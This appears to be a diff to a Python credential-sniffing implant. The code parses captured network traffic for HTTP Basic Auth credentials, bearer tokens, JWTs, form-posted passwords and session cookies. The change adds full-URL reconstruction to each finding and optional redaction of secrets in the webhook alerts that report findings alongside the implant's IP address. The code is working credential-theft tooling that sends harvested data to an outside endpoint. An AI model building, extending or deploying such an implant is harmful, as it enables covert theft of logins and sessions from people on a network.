@@ -197,7 +197,10 @@ def save_subnets(state: dict) -> None:
 
 def finding_hash(finding: dict) -> str:
     """Deterministic hash for deduplication."""
-    key = f"{finding['type']}|{finding['protocol']}|{finding.get('username', '')}|{finding.get('secret', '')}"
+    key = (
+        f"{finding['type']}|{finding['protocol']}|{finding.get('username', '')}|"
+        f"{finding.get('secret', '')}|{finding.get('url', '')}"
+    )
     return hashlib.sha256(key.encode()).hexdigest()[:16]
 
 
@@ -273,9 +276,9 @@ def _ip_str(raw: bytes) -> str:
 
 def _make_finding(
     ftype: str, protocol: str, src: str, dst: str,
-    username: str = "", secret: str = "", details: str = "",
+    username: str = "", secret: str = "", details: str = "", url: str = "",
 ) -> dict:
-    return {
+    finding = {
         "timestamp": datetime.now(timezone.utc).isoformat(),
         "type": ftype,
         "protocol": protocol,
@@ -285,6 +288,9 @@ def _make_finding(
         "secret": secret,
         "details": details,
     }
+    if url:
+        finding["url"] = url
+    return finding
 
 
 # ---- HTTP ----------------------------------------------------------------
@@ -292,6 +298,10 @@ def _make_finding(
 _AUTH_BASIC_RE = re.compile(rb"Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)", re.I)
 _AUTH_BEARER_RE = re.compile(rb"Authorization:\s*Bearer\s+(\S+)", re.I)
 _HTTP_HOST_RE = re.compile(rb"Host:\s*(\S+)", re.I)
+_HTTP_REQUEST_RE = re.compile(
+    rb"^(?:GET|POST|PUT|DELETE|HEAD|OPTIONS|PATCH)\s+(\S+)\s+HTTP/\d(?:\.\d)?",
+    re.I | re.M,
+)
 _FORM_FIELDS_RE = re.compile(
     rb"(?:user(?:name)?|login|email|pass(?:word|wd)?|passwd|pwd|token|"
     rb"session|secret|credential|auth)=([^&\s]+)",
@@ -307,12 +317,27 @@ _SESSION_COOKIE_NAMES = {
 _JWT_RE = re.compile(rb"eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+")
 
 
+def _http_url(payload: bytes, host: str) -> str:
+    """Reconstruct a cleartext HTTP request URL from its request line and Host."""
+    request_m = _HTTP_REQUEST_RE.search(payload)
+    if not request_m:
+        return ""
+
+    target = _safe_decode(request_m.group(1))
+    if target.lower().startswith(("http://", "https://")):
+        return target
+    if host and target.startswith("/"):
+        return f"http://{host}{target}"
+    return ""
+
+
 def parse_http(payload: bytes, src: str, dst: str) -> list[dict]:
     findings = []
     text = payload
 
     host_m = _HTTP_HOST_RE.search(text)
     host = _safe_decode(host_m.group(1)) if host_m else ""
+    url = _http_url(text, host)
 
     # Basic Auth
     m = _AUTH_BASIC_RE.search(text)
@@ -324,7 +349,7 @@ def parse_http(payload: bytes, src: str, dst: str) -> list[dict]:
                 findings.append(_make_finding(
                     "cleartext", "HTTP Basic Auth", src, dst,
                     username=user, secret=passwd,
-                    details=f"Host: {host}",
+                    details=f"Host: {host}", url=url,
                 ))
         except Exception:
             pass
@@ -347,7 +372,7 @@ def parse_http(payload: bytes, src: str, dst: str) -> list[dict]:
                 pass
         findings.append(_make_finding(
             "token", proto, src, dst,
-            secret=token[:500], details=details,
+            secret=token[:500], details=details, url=url,
         ))
 
     # Form POST credentials
@@ -361,6 +386,7 @@ def parse_http(payload: bytes, src: str, dst: str) -> list[dict]:
                 "cleartext", "HTTP Form POST", src, dst,
                 username=vals[0], secret=vals[1] if len(vals) > 1 else "",
                 details=f"Host: {host} | Fields: {len(matches)} params",
+                url=url,
             ))
 
     # Session cookies
@@ -374,6 +400,7 @@ def parse_http(payload: bytes, src: str, dst: str) -> list[dict]:
                         "token", "HTTP Session Cookie", src, dst,
                         secret=_safe_decode(cm.group(1))[:300],
                         details=f"Host: {host} | Matched: {name.decode()}",
+                        url=url,
                     ))
                     break
 
@@ -987,6 +1014,7 @@ def notify_openclaw(findings: list[dict]) -> None:
     token = os.environ.get("OPENCLAW_WEBHOOK_TOKEN", "")
     channel = os.environ.get("OPENCLAW_ALERT_CHANNEL_ID", "")
     implant_ip = os.environ.get("IMPLANT_WG_IP", "unknown")
+    redact_secrets = os.environ.get("OPENCLAW_REDACT_SECRETS", "yes").lower() == "yes"
 
     if not url or not token:
         return
@@ -1003,11 +1031,14 @@ def notify_openclaw(findings: list[dict]) -> None:
         if f.get("username"):
             parts.append(f"user={f['username']}")
         if f.get("secret"):
-            parts.append(f"secret={f['secret'][:120]}")
+            secret = "[REDACTED]" if redact_secrets else f["secret"][:120]
+            parts.append(f"secret={secret}")
         parts.append(f"src={f['src']}")
         parts.append(f"dst={f['dst']}")
         if f.get("details"):
             parts.append(f"details={f['details']}")
+        if f.get("url"):
+            parts.append(f"url={f['url']}")
         entries.append(" | ".join(parts))
 
     message = f"cred-alert: implant={implant_ip} count={len(findings)}\n" + "\n".join(entries)
